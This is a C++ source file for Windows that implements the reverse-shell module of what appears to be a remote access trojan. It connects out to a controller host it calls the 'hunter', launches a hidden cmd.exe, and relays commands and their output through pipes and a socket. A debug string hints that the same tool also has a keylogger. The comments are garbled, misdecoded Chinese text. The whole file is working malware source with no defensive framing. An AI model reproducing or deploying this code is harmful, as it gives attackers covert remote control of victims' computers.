#include "pch.h"
#include "Shell.h"

#define SEND_SIZE   128
#define RESULT_SIZE 256

static Shell gShell; // ��ʼ����
static TcpSocket gSock;
// �ĸ�HANDLE �������������ܵ�
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// ���������н���֮���õ���pi ����cmd����
static PROCESS_INFORMATION gPi = { 0 };
// �߳̾��
static HANDLE hReadSock, hReadPipe;
// ׼������
static CHAR szSend[SEND_SIZE] = { 0 };
static CHAR szResult[RESULT_SIZE] = { 0 };

void Shell::startShell(std::string domain, int port) {

	// �½����ӵ�hunter�˵�socket����
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}

	// �����ӽ���
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		gSock.dissconnect();
		return;
	}

	// ������������������߳�
	hReadSock = CreateThread(NULL, 0, Shell::threadReadSock, (LPVOID)NULL, 0, NULL);
	hReadPipe = CreateThread(NULL, 0, Shell::threadReadPipe, (LPVOID)NULL, 0, NULL);
	if ((!hReadSock) || (!hReadPipe)) {
		OutputDebugStringA("Failed to create new thread read socket\r\n");
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		gSock.dissconnect();
		TerminateProcess(gPi.hProcess, 0);
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// ����cmd�ӽ���
bool Shell::createCmd() {
	// ���������ܵ�
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failed\r\n");
		return false;
	}

	// ��Ϊ����ʹ�� ����Ҫ����׼��
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// ����cmd����
	STARTUPINFOA si = { 0 };
	// ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// ���ñ�׼��������ʹ��󵽹ܵ�
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// ƴ�����������е�����
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		return false;
	}

	
	return true;
}

// �̺߳��� �����socket��ת��
DWORD Shell::threadReadSock(LPVOID args) {

	int iRecv;
	DWORD dwBytesWrite;
	while (true)
	{
		RtlZeroMemory(szSend, sizeof(szSend));
		iRecv = gSock.recvData(szSend, sizeof(szSend));
		if (-1 == iRecv) {
			OutputDebugStringA("cannot read from sock and stop shell\r\n");
			break;
		}

		if (!WriteFile(ghWritePipe2, szSend, iRecv, &dwBytesWrite, NULL)) {
			OutputDebugStringA("cannot write to pipe and stop shell\r\n");
			break;
		}
	}

	CloseHandle(ghReadPipe1);
	CloseHandle(ghReadPipe2);
	CloseHandle(ghWritePipe1);
	CloseHandle(ghWritePipe2);
	TerminateProcess(gPi.hProcess, 0);
	gSock.dissconnect();
	// һ����˵ ���hunter�����ر���shellģ��
	// ������һ���̷߳������������˳� ��readpipe�߳�
	// ���п��ܻ������ڶ�ȡ�ܵ��������ݵĹ����� �޷������˳�
	// �������ǿ�йر���
	TerminateThread(hReadPipe, 0);
	return 1;
}

// ����cmd���Բ�����
DWORD Shell::threadReadPipe(LPVOID args) {

	while (true) {
		DWORD dwBytesResult = 0;
		RtlZeroMemory(szResult, sizeof(szResult));
		// ���ÿ���û������ �������Ա����߳������ù�
		if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
			OutputDebugStringA("cannot read pipe and stop shell\r\n");
			break;
		}

		// �����˾�д��socket
		if (!gSock.sendData(szResult, dwBytesResult)) {
			OutputDebugStringA("cannot write socket and stop shell\r\n");
			break;
		}
	}
	gSock.dissconnect();
	// ����ѹر�cmd���̵�������˶�ȡsocket���߳�
	return 1;
}
